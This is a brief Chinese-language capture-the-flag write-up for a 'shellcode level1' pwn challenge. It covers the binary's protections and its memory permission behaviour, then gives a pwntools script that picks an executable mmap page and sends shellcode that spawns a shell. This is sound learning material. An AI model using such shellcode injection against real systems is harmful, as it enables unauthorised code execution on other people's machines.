# shellcode level1

## 文件分析

下载`shellcode_level1`, NX on, PIE on, Canary on, RELRO full  
ghidra分析为64位程序

## 逆向

这次要我们选择内存单元执行，有stack, .bss, heap, mmap页等  
其中mmap分配时0页为rw-，后改为rwx；  
分配1页时为rwx，后改为---

只要输入4即可执行shellcode，同上题

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 33251)
sh.sendline(b'4') # mmap paper 0
shc = asm(shellcraft.amd64.sh(), arch='amd64')
sh.sendline(shc)
sh.interactive()
```

Done.
